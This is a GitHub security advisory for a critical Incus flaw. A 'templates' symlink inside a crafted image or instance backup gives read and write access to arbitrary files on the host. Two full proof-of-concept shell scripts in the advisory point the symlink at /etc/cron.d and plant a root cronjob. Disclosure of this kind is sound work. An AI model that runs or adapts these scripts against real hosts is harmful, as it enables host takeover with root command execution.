# [C] Incus has arbitrary file read+write on host via templates/ symlink in malicious image

## Summary
Severity: Critical
Advisory: GHSA-vxp5-584q-c479
CVE: CVE-2026-48752
CWE: CWE-73
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-vxp5-584q-c479
Type: github-advisory

## Affected
- Go: `github.com/lxc/incus/v7/cmd/incusd` — affected >=0 <7.2.0

## Details
### Summary

A specially crafted image or instance backup can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.


### Details

For container images, `internal/server/storage/utils.go` calls `archive.Unpack(imageFile, destPath, ...)`. The tar extraction path in `shared/archive/archive.go` excludes device nodes, but it does not reject a top-level `templates` symlink.

For instance backups, `internal/server/storage/drivers/driver_dir_volumes.go:rsync.LocalCopy` uses argument `-a` (archive mode), but does not add `--safe-links`. This allows a top-level `templates` symlink.

In practice, this allows a malicious actor to access an arbitrary directory and edit arbitrary files in it.


### PoC

#### Malicious container image

Below, the templates directory is  mapped to `/etc/cron.d` on the host, but it can be mapped anywhere. After that, create a cronjob to run `id` as root.

```
#!/bin/sh
set -eu

tmpdir=$(mktemp -d)
cleanup() {
    rm -rf "${tmpdir}"
}
trap cleanup EXIT INT QUIT TERM HUP

mkdir -p "${tmpdir}/img/rootfs"
ln -s /etc/cron.d "${tmpdir}/img/templates"
cat<<__EOF__>"${tmpdir}/img/metadata.yaml"
architecture: x86_64
creation_date: 1
properties:
  description: PoC templates symlink host afrw
__EOF__

cd "${tmpdir}/img"
tar --owner=0 --group=0 -f- -c * >../afrw-image-templates-symlink.tar
incus image import ../afrw-image-templates-symlink.tar --alias afrw-image-templates-symlink
incus init afrw-image-templates-symlink afrw-image-templates-symlink

incus config template ls afrw-image-templates-symlink

# read
#incus config template show afrw-image-templates-symlink $FILENAME

# write
printf "* * * * * root sh -c 'id>/pwned'\n" | incus config template create afrw-image-templates-symlink poc-32
#incus config template edit afrw-image-templates-symlink poc
```

#### Malicious instance backup


Below, the templates directory is mapped to `/etc/cron.d` on the host, but it can be mapped anywhere. After that, create a cronjob to run `id` as root.

```
#!/bin/sh
set -eu

tmpdir=$(mktemp -d)
cleanup() {
    rm -rf "${tmpdir}"
}
trap cleanup EXIT INT QUIT TERM HUP

mkdir -p "${tmpdir}/img/backup"
cat<<__EOF__>"${tmpdir}/img/backup/index.yaml"
name: afrw-backup-templates-symlink
backend: dir
pool: default
type: container
optimized: false
__EOF__

mkdir "${tmpdir}/img/backup/container"
cat<<__EOF__>"${tmpdir}/img/backup/container/backup.yaml"
container:
  name: afrw-backup-templates-symlink
  architecture: x86_64
  type: container
  status: Stopped
  status_code: 102
  stateful: false
  ephemeral: false
  profiles:
    - default
  config:
    volatile.uuid: 58a0f7de-2490-4e85-9fb2-153ef0fc7be5
    volatile.uuid.generation: 24d829e5-d74a-4285-88c0-be369140fb49
  expanded_config:
    volatile.uuid: 58a0f7de-2490-4e85-9fb2-153ef0fc7be5
    volatile.uuid.generation: 24d829e5-d74a-4285-88c0-be369140fb49
  devices: {}
  expanded_devices:
    root:
      path: /
      pool: default
      type: disk
  created_at: "2024-01-01T00:00:00Z"
  last_used_at: "2024-01-01T00:00:00Z"
volume:
  name: afrw-backup-templates-symlink
  type: container
  content_type: filesystem
  config: {}
pool:
  name: default
  driver: dir
  config: {}
__EOF__

cat<<__EOF__>"${tmpdir}/img/backup/container/metadata.yaml"
architecture: x86_64
creation_date: 1
properties:
  description: afrw-backup-templates-symlink
__EOF__

mkdir "${tmpdir}/img/backup/container/rootfs"
ln -s /etc/cron.d "${tmpdir}/img/backup/container/templates"

cd "${tmpdir}/img"
tar --owner=0 --group=0 -f- -c backup >../afrw-backup-templates-symlink.tar
incus import ../afrw-backup-templates-symlink.tar afrw-backup-templates-symlink

incus config template ls afrw-backup-templates-symlink

# read
#incus config template show afrw-backup-templates-symlink $FILENAME

# write
printf "* * * * * root sh -c 'id>/pwned'\n" | incus config template create afrw-backup-templates-symlink poc-32
#incus config template edit afrw-templates-symlink poc
```

### Impact

Arbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.

## References
- https://github.com/lxc/incus/security/advisories/GHSA-vxp5-584q-c479
- https://github.com/lxc/incus
